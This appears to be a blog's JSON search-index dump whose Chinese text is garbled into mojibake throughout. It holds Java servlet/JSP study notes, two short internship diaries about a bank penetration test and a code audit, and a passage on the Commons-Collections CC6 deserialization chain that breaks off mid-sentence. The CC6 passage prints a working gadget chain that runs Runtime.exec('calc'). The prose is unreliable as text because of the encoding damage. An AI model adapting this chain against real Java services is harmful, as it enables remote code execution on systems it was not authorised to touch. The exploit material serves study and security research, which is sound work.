doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123; doGet(req, resp); &#125;&#125; 0x07 JSP7.1 ä»€ä¹ˆ JSPJava Server Pages ï¼š JavaæœåŠ¡å™¨ç«¯é¡µé¢ï¼Œä¹Ÿå’ŒServletä¸€æ ·ï¼Œç”¨äºåŠ¨æ€WebæŠ€æœ¯ï¼ æœ€å¤§çš„ç‰¹ç‚¹ï¼š å†™JSPå°±åƒåœ¨å†™HTML åŒºåˆ«ï¼š HTMLåªç»™ç”¨æˆ·æä¾›é™æ€çš„æ•°æ® JSP é¡µé¢ä¸­å¯ä»¥åµŒå…¥Java ä»£ç ï¼Œä¸ºç”¨æˆ·æä¾›åŠ¨æ€æ•°æ®ï¼› 7.2 JSP åŸç†æœåŠ¡å™¨å†…éƒ¨å·¥ä½œï¼š Tomcat ä¸­æœ‰ä¸€ä¸ª work å·¥ä½œç›®å½•ï¼› IDEA ä¸­ä½¿ç”¨ Tomcat çš„ä¼šåœ¨ IDEA ä¸­ Tomcat ä¸­ç”Ÿäº§ä¸€ä¸ª work ç›®å½• å‘ç°é¡µé¢è½¬å˜æˆäº† Java ç¨‹åº æµè§ˆå™¨å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œä¸ç®¡è®¿é—®ä»€ä¹ˆèµ„æºï¼Œèµ·å§‹éƒ½æ˜¯åœ¨è®¿é—® Servlet ï¼ JSP æœ€ç»ˆä¹Ÿä¼šè¢«è½¬æ¢æˆä¸€ä¸ª Java ç±»ï¼ JSP æœ¬è´¨ä¸Šå°±æ˜¯ä¸€ä¸ª Servlet 12345678910//åˆå§‹åŒ– public void _jspInit() &#123; &#125;//é”€æ¯ public void _jspDestroy() &#123; &#125;//JSPService public void _jspService(.HttpServletRequest request,HttpServletResponse response) åˆ¤æ–­è¯·æ±‚ å†…ç½®ä¸€äº›å¯¹è±¡ 12345678final javax.servlet.jsp.PageContext pageContext; //é¡µé¢ä¸Šä¸‹æ–‡javax.servlet.http.HttpSession session = null; //sessionfinal javax.servlet.ServletContext application; //applicationContextfinal javax.servlet.ServletConfig config; //configjavax.servlet.jsp.JspWriter out = null; //outfinal java.lang.Object page = this; //pageï¼šå½“å‰HttpServletRequest request //è¯·æ±‚HttpServletResponse response //å“åº” è¾“å‡ºé¡µé¢å‰å¢åŠ çš„ä»£ç  123456789response.setContentType(&quot;text/html&quot;); //è®¾ç½®å“åº”çš„é¡µé¢ç±»å‹pageContext = _jspxFactory.getPageContext(this, request, response, null, true, 8192, true);_jspx_page_context = pageContext;application = pageContext.getServletContext();config = pageContext.getServletConfig();session = pageContext.getSession();out = pageContext.getOut();_jspx_out = out; ä»¥ä¸Šè¿™äº›å¯¹è±¡å¯ç›´æ¥åœ¨ JSP ä¸­ä½¿ç”¨ åœ¨JSPé¡µé¢ä¸­ï¼› åªè¦æ˜¯ JAVAä»£ç å°±ä¼šåŸå°ä¸åŠ¨çš„è¾“å‡ºï¼› å¦‚æœæ˜¯HTMLä»£ç ï¼Œå°±ä¼šè¢«è½¬æ¢ä¸ºï¼š 1out.write(&quot;&lt;html&gt;\\r &quot;); è¿™æ ·çš„æ ¼å¼ï¼Œè¾“å‡ºåˆ°å‰ç«¯ï¼ 7.3 JSP åŸºç¡€è¯­æ³•JSP è¡¨è¾¾å¼ 12345&lt;%--JSPè¡¨è¾¾å¼ä½œç”¨ï¼šç”¨æ¥å°†ç¨‹åºçš„è¾“å‡ºï¼Œè¾“å‡ºåˆ°å®¢æˆ·ç«¯&lt;%= å˜é‡æˆ–è€…è¡¨è¾¾å¼%&gt;--%&gt;&lt;%= new java.util.Date()%&gt; JSP è„šæœ¬ç‰‡æ®µ 12345678&lt;%--jspè„šæœ¬ç‰‡æ®µ--%&gt;&lt;% int sum = 0; for (int i = 1; i &lt;=100 ; i++) &#123; sum+=i; &#125; out.println(&quot;&lt;h1&gt;Sum=&quot;+sum+&quot;&lt;/h1&gt;&quot;);%&gt; è„šæœ¬ç‰‡æ®µçš„å†å®ç° 1234567891011121314151617181920212223&lt;% int x = 10; out.println(x);%&gt;&lt;p&gt;è¿™æ˜¯ä¸€ä¸ªJSPæ–‡æ¡£&lt;/p&gt;&lt;% int y = 2; out.println(y);%&gt;&lt;hr&gt;&lt;%--åœ¨ä»£ç åµŒå…¥HTMLå…ƒç´ --%&gt;&lt;% for (int i = 0; i &lt; 5; i++) &#123;%&gt; &lt;h1&gt;Hello,World &lt;%=i%&gt; &lt;/h1&gt;&lt;% &#125;%&gt; JSP å£°æ˜ 1234567891011&lt;%! static &#123; System.out.println(&quot;Loading Servlet!&quot;); &#125; private int globalVar = 0; public void kuang()&#123; System.out.println(&quot;è¿›å…¥äº†æ–¹æ³•Kuangï¼&quot;); &#125;%&gt; JSP å£°æ˜ï¼š ä¼šè¢«ç¼–è¯‘åˆ° JSP ç”Ÿæˆ Java çš„ç±»ä¸­ï¼ å…¶ä»–çš„ï¼Œå°±ä¼šè¢«ç”Ÿæˆ _jspService æ–¹æ³•ä¸­ï¼ 1234&lt;%%&gt;&lt;%=%&gt;&lt;%!%&gt;&lt;%--æ³¨é‡Š--%&gt; JSP çš„æ³¨é‡Šï¼Œä¸ä¼šåœ¨å®¢æˆ·ç«¯æ˜¾ç¤ºï¼ŒHTMLå°±ä¼šï¼ 7.4 JSP æŒ‡ä»¤123456789101112131415161718192021&lt;%@page args.... %&gt;&lt;%@include file=&quot;&quot;%&gt;&lt;%--@includeä¼šå°†ä¸¤ä¸ªé¡µé¢åˆäºŒä¸ºä¸€--%&gt;&lt;%@include file=&quot;common/header.jsp&quot;%&gt;&lt;h1&gt;ç½‘é¡µä¸»ä½“&lt;/h1&gt;&lt;%@include file=&quot;common/footer.jsp&quot;%&gt;&lt;hr&gt;&lt;%--jSPæ ‡ç­¾ jsp:includeï¼šæ‹¼æ¥é¡µé¢ï¼Œæœ¬è´¨è¿˜æ˜¯ä¸‰ä¸ª --%&gt;&lt;jsp:include page=&quot;/common/header.jsp&quot;/&gt;&lt;h1&gt;ç½‘é¡µä¸»ä½“&lt;/h1&gt;&lt;jsp:include page=&quot;/common/footer.jsp&quot;/&gt; 7.5 ä¹å¤§å†…ç½®å¯¹è±¡ PageContext å­˜ä¸œè¥¿ Request å­˜ä¸œè¥¿ Response Session å­˜ä¸œè¥¿ Application ã€ServletContextã€‘ å­˜ä¸œè¥¿ config ã€ServletConfigã€‘ out page exception 1234pageContext.setAttribute(&quot;name1&quot;,&quot;she11f1&quot;); //ä¿å­˜çš„æ•°æ®åªåœ¨ä¸€ä¸ªé¡µé¢ä¸­æœ‰æ•ˆrequest.setAttribute(&quot;name2&quot;,&quot;she11f2å·&quot;); //ä¿å­˜çš„æ•°æ®åªåœ¨ä¸€æ¬¡è¯·æ±‚ä¸­æœ‰æ•ˆï¼Œè¯·æ±‚è½¬å‘ä¼šæºå¸¦è¿™ä¸ªæ•°æ®session.setAttribute(&quot;name3&quot;,&quot;she11f3å·&quot;); //ä¿å­˜çš„æ•°æ®åªåœ¨ä¸€æ¬¡ä¼šè¯ä¸­æœ‰æ•ˆï¼Œä»æ‰“å¼€æµè§ˆå™¨åˆ°å…³é—­æµè§ˆå™¨application.setAttribute(&quot;name4&quot;,&quot;she11f4å·&quot;); //ä¿å­˜çš„æ•°æ®åªåœ¨æœåŠ¡å™¨ä¸­æœ‰æ•ˆï¼Œä»æ‰“å¼€æœåŠ¡å™¨åˆ°å…³é—­æœåŠ¡å™¨ requestï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œäº§ç”Ÿçš„æ•°æ®ï¼Œç”¨æˆ·çœ‹å®Œå°±æ²¡ç”¨äº†ï¼Œæ¯”å¦‚ï¼šæ–°é—»ï¼Œç”¨æˆ·çœ‹å®Œæ²¡ç”¨çš„ï¼ sessionï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œäº§ç”Ÿçš„æ•°æ®ï¼Œç”¨æˆ·ç”¨å®Œä¸€ä¼šè¿˜æœ‰ç”¨ï¼Œæ¯”å¦‚ï¼šè´­ç‰©è½¦ï¼› applicationï¼šå®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œäº§ç”Ÿçš„æ•°æ®ï¼Œä¸€ä¸ªç”¨æˆ·ç”¨å®Œäº†ï¼Œå…¶ä»–ç”¨æˆ·è¿˜å¯èƒ½ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼šèŠå¤©æ•°æ®ï¼› 0x08 JavaBeanå®ä½“ç±»JavaBeanæœ‰ç‰¹å®šçš„å†™æ³•ï¼š å¿…é¡»è¦æœ‰ä¸€ä¸ªæ— å‚æ„é€  å±æ€§å¿…é¡»ç§æœ‰åŒ– å¿…é¡»æœ‰å¯¹åº”çš„get&#x2F;setæ–¹æ³•ï¼› ä¸€èˆ¬ç”¨æ¥å’Œæ•°æ®åº“çš„å­—æ®µåšæ˜ å°„ ORMï¼› ORM ï¼šå¯¹è±¡å…³ç³»æ˜ å°„ è¡¨â€”&gt;ç±» å­—æ®µâ€“&gt;å±æ€§ è¡Œè®°å½•â€”-&gt;å¯¹è±¡ id name age address 1 sjmp01 3 1 2 sjmp02 3 2 3 sjmp02 3 3 123456789101112class People&#123; private int id; private String name; private int id; private String address;&#125;class A&#123; new People(1,&quot;1å·&quot;,3ï¼Œ&quot;è¥¿å®‰&quot;); new People(2,&quot;2å·&quot;,3ï¼Œ&quot;è¥¿å®‰&quot;); new People(3,&quot;3å·&quot;,3ï¼Œ&quot;è¥¿å®‰&quot;);&#125; 0x09 MVC ä¸‰å±‚æ¶æ„ä»€ä¹ˆæ˜¯ MVC ï¼š Model View Controller æ¨¡å‹ã€è§†å›¾ã€æ§åˆ¶å™¨ 9.1 ä»¥å‰ ç”¨æˆ·ç›´æ¥è®¿é—®æ§åˆ¶å±‚ï¼Œæ§åˆ¶å±‚å°±å¯ä»¥ç›´æ¥æ“ä½œæ•°æ®åº“ï¼› 12345678910servlet--CRUD--&gt;æ•°æ®åº“å¼Šç«¯ï¼šç¨‹åºååˆ†è‡ƒè‚¿ï¼Œä¸åˆ©äºç»´æŠ¤ servletçš„ä»£ç ä¸­ï¼šå¤„ç†è¯·æ±‚ã€å“åº”ã€è§†å›¾è·³è½¬ã€å¤„ç†JDBCã€å¤„ç†ä¸šåŠ¡ä»£ç ã€å¤„ç†é€»è¾‘ä»£ç æ¶æ„ï¼šæ²¡æœ‰ä»€ä¹ˆæ˜¯åŠ ä¸€å±‚è§£å†³ä¸äº†çš„ï¼ç¨‹åºçŒ¿è°ƒç”¨|JDBC|Mysql Oracle SqlServer .... 9.2 MVC ä¸‰å±‚æ¶æ„ Model ä¸šåŠ¡å¤„ç†ï¼šä¸šåŠ¡é€»è¾‘ï¼ˆServiceï¼‰ æ•°æ®æŒä¹…å±‚ï¼šCRUD View å±•ç¤ºæ•°æ® æä¾›é“¾æ¥å‘èµ· Servlet è¯·æ±‚ï¼ˆa,form,imgâ€¦ï¼‰ Controller ï¼ˆServletï¼‰ æ¥æ”¶ç”¨æˆ·çš„è¯·æ±‚ï¼šï¼ˆreqï¼šè¯·æ±‚å‚æ•°ã€Session ä¿¡æ¯â€¦ï¼‰ äº¤ç»™ä¸šåŠ¡å±‚å¤„ç†å¯¹åº”çš„ä»£ç  æ§åˆ¶è¯•å›¾çš„è·³è½¬ 1ç™»å½•---&gt;æ¥æ”¶ç”¨æˆ·çš„ç™»å½•è¯·æ±‚---&gt;å¤„ç†ç”¨æˆ·çš„è¯·æ±‚ï¼ˆè·å–ç”¨æˆ·ç™»å½•çš„å‚æ•°ï¼Œusernameï¼Œpasswordï¼‰----&gt;äº¤ç»™ä¸šåŠ¡å±‚å¤„ç†ç™»å½•ä¸šåŠ¡ï¼ˆåˆ¤æ–­ç”¨æˆ·åå¯†ç æ˜¯å¦æ­£ç¡®ï¼šäº‹åŠ¡ï¼‰---&gt;Daoå±‚æŸ¥è¯¢ç”¨æˆ·åå’Œå¯†ç æ˜¯å¦æ­£ç¡®--&gt;æ•°æ®åº“ 0x10 è¿‡æ»¤å™¨Filterï¼šè¿‡æ»¤å™¨ï¼Œç”¨æ¥è¿‡æ»¤ç½‘ç«™çš„æ•°æ®ï¼› å¤„ç†ä¸­æ–‡ä¹±ç  ç™»å½•éªŒè¯ 12345678910111213141516171819202122public class FilterTest implements Filter &#123; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; servletRequest.setCharacterEncoding(&quot;utf-8&quot;); servletResponse.setCharacterEncoding(&quot;utf-8&quot;); servletResponse.setContentType(&quot;text/html;charset=UTF-8&quot;); System.out.println(&quot;CharacterEncodingFilteræ‰§è¡Œå‰....&quot;); filterChain.doFilter(servletRequest,servletResponse); //è®©æˆ‘ä»¬çš„è¯·æ±‚ç»§ç»­èµ°ï¼Œå¦‚æœä¸å†™ï¼Œç¨‹åºåˆ°è¿™é‡Œå°±è¢«æ‹¦æˆªåœæ­¢ï¼ System.out.println(&quot;CharacterEncodingFilteræ‰§è¡Œå....&quot;); &#125; @Override public void destroy() &#123; System.out.println(&quot;Filter é”€æ¯&quot;); &#125; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; System.out.println(&quot;Filter åˆå§‹åŒ–&quot;); &#125;&#125; 12345678&lt;filter&gt; &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.she11f.javaweb.FilterTest&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;CharacterEncodingFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/servlet/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt; 0x11 ç›‘å¬å™¨ç¼–å†™ä¸€ä¸ªç›‘å¬å™¨å®ç°ç›‘å¬å™¨çš„æ¥å£â€¦ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748//ç»Ÿè®¡ç½‘ç«™åœ¨çº¿äººæ•° ï¼š ç»Ÿè®¡sessionpublic class OnlineCountListener implements HttpSessionListener &#123; //åˆ›å»ºsessionç›‘å¬ï¼š çœ‹ä½ çš„ä¸€ä¸¾ä¸€åŠ¨ //ä¸€æ—¦åˆ›å»ºSessionå°±ä¼šè§¦å‘ä¸€æ¬¡è¿™ä¸ªäº‹ä»¶ï¼ public void sessionCreated(HttpSessionEvent se) &#123; ServletContext ctx = se.getSession().getServletContext(); System.out.println(se.getSession().getId()); Integer onlineCount = (Integer) ctx.getAttribute(&quot;OnlineCount&quot;); if (onlineCount==null)&#123; onlineCount = new Integer(1); &#125;else &#123; int count = onlineCount.intValue(); onlineCount = new Integer(count+1); &#125; ctx.setAttribute(&quot;OnlineCount&quot;,onlineCount); &#125; //é”€æ¯sessionç›‘å¬ //ä¸€æ—¦é”€æ¯Sessionå°±ä¼šè§¦å‘ä¸€æ¬¡è¿™ä¸ªäº‹ä»¶ï¼ public void sessionDestroyed(HttpSessionEvent se) &#123; ServletContext ctx = se.getSession().getServletContext(); Integer onlineCount = (Integer) ctx.getAttribute(&quot;OnlineCount&quot;); if (onlineCount==null)&#123; onlineCount = new Integer(0); &#125;else &#123; int count = onlineCount.intValue(); onlineCount = new Integer(count-1); &#125; ctx.setAttribute(&quot;OnlineCount&quot;,onlineCount); &#125; /* Sessioné”€æ¯ï¼š 1. æ‰‹åŠ¨é”€æ¯ getSession().invalidate(); 2. è‡ªåŠ¨é”€æ¯ */&#125; 12345&lt;!--æ³¨å†Œç›‘å¬å™¨--&gt;&lt;listener&gt; &lt;listener-class&gt;com.kuang.listener.OnlineCountListener&lt;/listener-class&gt;&lt;/listener&gt;","tags":["java å¼€å‘"],"categories":["å¼€å‘"]},{"title":"å†œæ‘ä¿¡ç”¨ç¤¾ä»£ç å®¡è®¡å°è®°","path":"/2024/08/16/work/å†œæ‘ä¿¡ç”¨ç¤¾ä»£ç è®¾è®¡/","content":"å†œä¿¡ä»£ç å®¡è®¡ ä»èµ£å·é“¶è¡Œå›æ¥çš„ç¬¬äºŒå¤©å°±åˆå»å†œæ‘ä¿¡ç”¨ç¤¾åšä»£ç å®¡è®¡äº†ï¼Œå› ä¸ºå®ä¹ ç”Ÿé‡Œåªæœ‰æˆ‘ä¼š javaï¼Œæ‰€ä»¥æˆ‘å°±ä¸»åŠ¨è¯·ç¼¨äº†ã€‚ ç¬¬ä¸€å‘¨æ˜¯å››ä¸ªäººï¼Œç‹å“¥ï¼Œé£å“¥ï¼Œæ°´å“¥å’Œæˆ‘ï¼Œè¢«ä¸‰ä¸ªå¤§ä½¬å¸¦çœŸçš„å®‰å…¨æ„Ÿåè¶³å¥½å§ï¼Œä¸è¿‡æˆ‘è¿˜æ˜¯è¦åæ§½ä¸€ä¸‹ï¼Œå†œç¤¾é‚£è¾¹ç»™çš„æ˜¯è€ç‰ˆä»£ç ï¼Œè¿˜ç»™çš„ä¸å…¨ï¼Œæˆ‘åˆ†åˆ°çš„è¿ä»£ç éƒ½ä¸å®Œæ•´ã€‚jar åŒ…åªæœ‰ä¸€ä¸ª jdk åŒ…ï¼Œè°ƒè¯•éƒ½è°ƒä¸äº†ï¼Œæ‰¾ä¸åˆ°è°ƒç”¨ã€‚å°±åœ¨é‚£é‡Œå—¯çœ‹ä»£ç ï¼Œåé¢æˆ‘æ‘†çƒ‚äº†å°±å‡†å¤‡æ‰¾ç‚¹ä¿¡æ¯æ³„éœ²å°±ç®—äº†ã€‚ ä¸è¿‡å†œä¿¡é‚£è¾¹é£æ™¯æŒºå¥½çš„ï¼Œä»–ä»¬å…¬å¸å¯¹é¢å°±æ˜¯ç‘¶æ¹–ï¼ˆåé¢æ‰çŸ¥é“åŸæ¥è¿™ä¸ªæ˜¯è‰¾æºªæ¹–ï¼‰ï¼Œæˆ‘å¸¸å¸¸ç›¯ç€ç‘¶æ¹–å‘ä¸€ä¼šå„¿å‘†ã€‚ ç¬¬äºŒå‘¨æ°´å“¥å°±å»å€¼å®ˆäº†ï¼Œæˆ‘ä¹ŸæŒ–ä¸å‡ºä»€ä¹ˆä¸œè¥¿æ¥äº†ï¼Œçœ‹æ¥æˆ‘çš„ java å®¡è®¡æ°´å¹³è¿˜æ˜¯å¾ˆä¸€èˆ¬å•Šã€‚æˆ‘æƒ³å…ˆè½¬ php ä»£ç å®¡è®¡äº†ï¼Œå…ˆä»ç®€å•ç»ƒèµ·å§ã€‚å½“ç„¶ä¹Ÿä¸æ˜¯æ”¾å¼ƒ java ä»£ç å®¡è®¡å­¦ä¹ äº†ï¼Œåªæ˜¯è¯´æš‚æ—¶æŠŠä¸­å¿ƒæ”¾å› php è¿™è¾¹ï¼Œæ¯•ç«Ÿå¹³æ—¶ php ä»£ç å®¡è®¡åªæ˜¯æ‰“æ‰“ ctfï¼Œè¿˜æ˜¯æƒ³åœ¨ php ä¸Šå®æˆ˜ä¸€ç•ªçš„ï¼Œç„¶åå­¦ä¹  php å®¡è®¡çš„æ—¶å€™ä¸€è¾¹å­¦ä¹  java å¼€å‘çŸ¥è¯†æ‰“å¥½åŸºç¡€å§ï¼Œæ¯•ç«Ÿ java å¼€å‘çš„éƒ½æ˜¯å¤§ç½‘ç«™ï¼Œå®¡è®¡é—¨æ§›æŒºé«˜çš„ã€‚ 2024.8.14ä»Šå¤©å®¡çš„å·®ä¸å¤šäº†ï¼Œæ˜å¤©å†™ä¸€ä¸‹æŠ¥å‘Šå°±å¯ä»¥æºœæºœçƒå›ç»¿ç›Ÿäº†ã€‚ã€‚ã€‚","tags":["æ—¥å¸¸","å®ä¹ ","ç”Ÿæ´»"],"categories":["æ‰“å·¥äººçš„ä¸‰ä¸¤äº‹"]},{"title":"èµ£å·é“¶è¡Œå‡ºå·®å°è®°","path":"/2024/08/14/work/èµ£å·é“¶è¡Œå‡ºå·®äº”æ—¥æ¸¸/","content":"èµ£é“¶ä¹‹æ—… ç¬¬ä¸€æ¬¡å‡ºå·®å»é“¶è¡Œåšæ¸—é€æµ‹è¯•ï¼Œå¸¦æˆ‘ä»¬å»çš„æ˜¯æ·å“¥ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬ 15 çº§çš„è€å­¦é•¿äº†ã€‚ é“¶è¡Œæ•´ç†èµ„äº§ç»™æˆ‘æµ‹è¯•ï¼Œç¬¬ä¸€å¤©å°±æ²¡ç»·ä½ï¼Œç½‘ç«™ç½‘ç«™æ— æ³•è®¿é—®ï¼Œapp ä¹Ÿæ‰“ä¸å¼€ï¼Œæ‰¾é“¶è¡Œçš„æŠ€æœ¯äººå‘˜è§£å†³é—®é¢˜ä¹Ÿæ˜¯ç›¸äº’æ¨æ¥æ¨å»ï¼Œå¯èƒ½éƒ½æ€•æ‹…è´£å§ã€‚ ç„¶åæ™šä¸Šä¸œå“¥è¯·å®¢åƒæµ·é²œå¤§é¤ï¼Œå¯æ˜¯è¦å–é…’ï¼Œä¸èƒœé…’åŠ›çš„æˆ‘å¾ˆå¿«å°±å¤´æ™•ä¸Šè„¸äº†ï¼ŒçœŸå¾—å›å»å¥½å¥½ç»ƒä¸€ä¸‹äº†ï¼ˆä»¥å‰çš„æˆ‘ä¸å±‘ä¸€é¡¾ï¼Œç°åœ¨çš„æˆ‘é€å¸§å­¦ä¹ ã€‚ã€‚ã€‚ï¼‰ï¼Œä¸€å›é…’åº—éš¾å—çš„å¾ˆï¼Œçœ‹åˆ°é©¬æ¡¶å°±æƒ³åï¼Œç„¶åå°±æŠ±ç€é©¬æ¡¶åäº†ä¸‰å››å›å§ï¼Œæµ·é²œå¤§é¤ç®—æ˜¯ç™½åƒäº†ã€‚ åé¢å°±æ˜¯ç™½å¤©åœ¨å…¬å¸åšæ¸—é€æµ‹è¯•ï¼Œæ™šä¸Šåœ¨é…’åº—ç»™å‡†å¤‡ä¸¾åŠçš„ç¬¬ä¸€å±Šæ ¡èµ›å‡ºé¢˜ã€‚æ€»çš„æ¥è¯´è¿™äº”å¤©æŒºå……å®çš„ï¼Œä¸è™šæ­¤è¡Œå§ã€‚ 2024.8.1 æ™šä»Šå¤©å‘¨å››ï¼Œé åŒ—äº†åˆåœ¨èµ£å·å‘†äº†å››å¤©ï¼Œä¸Šä¸ªæ˜ŸæœŸçš„å·¥ä½œæ²¡åšå®Œæ‰€ä»¥å›æ¥äº†ï¼Œè¿™æ¬¡è™å“¥å¸¦é£ã€‚è™å“¥å’Œæ·å“¥ä¸€æ ·ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬ 15 çº§çš„å­¦é•¿ï¼Œè™å“¥è¯·åƒäº†å¥½å‡ é¡¿é¥­ï¼Œå“ˆå“ˆå“ˆæ„Ÿè§‰è‡ªå·±è„¸çš®å¥½åšæ··äº†å­¦é•¿ä»¬å¥½å‡ é¡¿é¥­åƒã€‚ è¿™æ¬¡æ¥èµ£å·åˆä»è™å“¥é‚£é‡Œå­¦åˆ°äº†å¾ˆå¤šä¸œè¥¿ï¼Œå¤ªå¤ªå¤ªä¸è™šæ­¤è¡Œäº†ï¼ï¼ï¼æ˜å¤©ä¸‹åˆçš„é«˜é“ï¼Œå¸Œæœ›æ˜å¤©ä¸Šåˆæˆ‘èƒ½æŠŠä¸ªäººç½‘é“¶æµ‹å®Œã€‚ 2024.8.2å‘œå‘œå‘œï¼Œè¿˜æ˜¯æ²¡æµ‹å®Œï¼Œèµ£å·ä¸‹å‘¨è§ (â•¯â€µâ–¡â€²)â•¯ï¸µâ”»â”â”» 2024.8.6èµ£å·ï¼Œæˆ‘è¸é©¬åˆæ¥è¾£ï¼è¿™æ¬¡é…’åº—å‡çº§äº†ï¼Œå¯ä»¥åƒæ—©é¤è‡ªåŠ©äº†ï¼Œå¥½è€¶ï¼ï¼ï¼ 2024.8.6æ´»ç»ˆäºå¹²å®Œäº†ï¼Œæ™šä¸Šå»é€›äº†ä¸€ä¸‹ï¼Œæœ€åçœ‹å‡ ç»„æˆ‘æ‹çš„ç…§ç‰‡å§","tags":["æ—¥å¸¸","å®ä¹ ","ç”Ÿæ´»"],"categories":["æ‰“å·¥äººçš„ä¸‰ä¸¤äº‹"]},{"title":"CC6 é“¾","path":"/2024/08/04/java/ååºåˆ—åŒ–é“¾/CC é“¾/CC6/","content":"Java ååºåˆ—åŒ–ç¬¬ä¸‰æ¡é“¾ CC6 JDK ç‰ˆæœ¬ï¼šä»»æ„ 0x01 æ„ä¹‰æœ‰äº† cc1 çš„ä¸¤ç§é“¾ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¿˜è¦å­¦ä¹  cc6 å‘¢ï¼Ÿå› ä¸º cc1 å›ºç„¶å¥½ç”¨ï¼Œä½†æ˜¯å¯¹ JDK ç‰ˆæœ¬è¦æ±‚ï¼Œä¸èƒ½å¤§äºç­‰äº 71 ï¼Œè€Œæˆ‘ä»¬ä»Šå¤©å­¦çš„ cc6 å°±æ²¡æœ‰ç‰ˆæœ¬è¦æ±‚äº† ä¸ºä»€ä¹ˆ cc1 åœ¨ jdk é«˜ç‰ˆæœ¬å°±ä¸èƒ½ç”¨äº†å‘¢ï¼Œä¸»è¦åŸå›  æ˜¯ sun.reflect.annotation.AnnotationInvocationHandler#readObject çš„é€»è¾‘å˜åŒ–äº†ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªè¡Œå»äº†è§£ã€‚ 0x02 åˆ†ææ—¢ç„¶ AnnotationInvocationHandler#readObject ä¸èƒ½ç”¨äº†ï¼Œæˆ‘ä»¬åªèƒ½æ‰¾å¦ä¸€æ¡é“¾å­äº†ï¼Œè€Œ cc6 çš„æ ¸å¿ƒå°±æ˜¯æ‰¾åˆ°äº†å¦ä¸€ä¸ªç±»çœ‹çœ‹èƒ½ä¸èƒ½å’Œ LazyMap.get è¿ä¸Š TiedMapEntry å¯ä»¥çœ‹åˆ°è¿™ä¸ªç±»çš„ getValue æ–¹æ³•è°ƒç”¨äº† get å‡½æ•° 123public Object getValue() &#123; return map.get(key);&#125; ç„¶åè¿™ä¸ªç±»çš„ hashcode æ–¹æ³•åˆè°ƒç”¨äº† getValue 12345public int hashCode() &#123; Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; é‚£ä¹ˆè°åˆè°ƒç”¨äº† hashcodeï¼Œæ¬¸ï¼Œç¬¬ä¸€æ¡ URLDNS é“¾æ˜¯ä¸æ˜¯è§è¿‡è¿™ä¸ªå‡½æ•°ï¼Œåœ¨ HashMap ç±»é‡Œï¼ŒCC6 ä¹Ÿæ˜¯æ‰¾ä¸Šäº†è¿™ä¸ªç±»ï¼Œè¿™ä¸ªç±»çš„readObject è°ƒç”¨äº† hash æ–¹æ³• 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16); &#125; æœ€åè°ƒç”¨key.hashCode,keyå°±æ˜¯æˆ‘ä»¬å¯æ§å‚æ•°ï¼Œæˆ‘ä»¬åªéœ€è¦è®©keyç­‰äºTiedMapEntryå³å¯ï¼å› æ­¤å¯ä»¥å¼€å§‹ç¼–å†™CC6é“¾é›å½¢äº†ï¼š 1234567891011121314Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;), new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);HashMap&lt;Object,Object&gt; map = new HashMap&lt;&gt;();Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;aaa&quot;);HashMap&lt;Object,Object&gt; map2 = new HashMap&lt;&gt;();map2.put(tiedMapEntry, &quot;bbb&quot;);serialize(map2); å˜»å˜»ï¼Œåºåˆ—åŒ–çš„æ—¶å€™å°±å¼¹è®¡ç®—å™¨äº†ï¼Œè¿™åœºæ™¯æ˜¯ä¸æ˜¯å’Œ URLDNS å¦‚å‡ºä¸€è¾™ï¼ˆåºåˆ—åŒ–çš„æ—¶å€™å°±å‘èµ·äº† DNS è§£æï¼‰ï¼Œå…¶å®ä¸€æ ·çš„é“ç†ï¼Œåœ¨ç¬¬äºŒä¸ª putï¼Œ map2.put çš„æ—¶å€™å°±ä¼šè°ƒç”¨ key.hashCodeï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä¼ ä¸€ä¸ªå‡çš„å‚æ•°ç»™ä»»æ„æ–¹æ³•ï¼Œè®©è¿™æ¡é“¾å­ä¸èƒ½æ­£å¸¸æ‰§è¡Œï¼Œç„¶ååœ¨ put ä¹‹åé€šè¿‡åå°„ä¿®æ”¹å›æ¥å°±è¡Œï¼Œè¿™æ ·å°±èƒ½è¾¾åˆ°åºåˆ—åŒ–ä¸èƒ½å‘½ä»¤æ‰§è¡Œï¼Œååºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥ è¿™é‡Œé€‰æ‹©åœ¨ LazyMap å®ä¾‹åŒ–çš„æ—¶å€™ä¿®æ”¹ï¼ˆå½“ç„¶ä½ ä¹Ÿå¯ä»¥ä¿®æ”¹ ChainedTransformerï¼ŒTiedMapEntryï¼‰ 1Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1)); è¿™æ ·åºåˆ—åŒ–çš„æ—¶å€™èµ°åˆ° LazyMap 